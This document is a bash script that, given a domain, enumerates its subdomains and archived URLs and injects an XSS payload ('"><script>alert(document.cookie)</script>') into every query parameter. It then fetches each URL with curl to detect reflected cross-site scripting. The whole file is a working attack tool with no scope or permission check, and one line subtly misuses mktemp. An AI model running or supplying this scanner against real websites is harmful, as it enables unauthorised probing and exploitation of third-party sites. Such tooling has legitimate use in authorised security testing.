#!/usr/bin/env bash
#
# Author:       Riccardo Mollo (riccardomollo84@gmail.com)
#
# Name:	        find_reflected_xss.sh
#
# Description:  A script that, given a domain, tries to find URLs vulnerable to
#               Reflected Cross-Site Scripting (XSS) attacks.
#
# Usage:        ./find_reflected_xss.sh <DOMAIN>
#
#
# --TODO--
# - ???
#
#
################################################################################


# VARIABLES --------------------------------------------------------------------

DOMAIN=$1


# MAIN -------------------------------------------------------------------------

DIR=$(mktemp -d -u --suffix="$DOMAIN")
cd $DIR

subfinder -d "$1" -o subs.txt
cat subs.txt | httpx -o alive_subs.txt
cat alive_subs.txt | waybackurls | tee wayback_urls.txt
cat wayback_urls.txt | grep '=' | tee param_urls.txt
cat param_urls.txt | grep '=' | qsreplace '"><script>alert(document.cookie)</script>' | while read -r url ; do 
    curl -s "$url" | grep -q "alert" && echo "[XSS Found] $url" | tee -a output.txt
done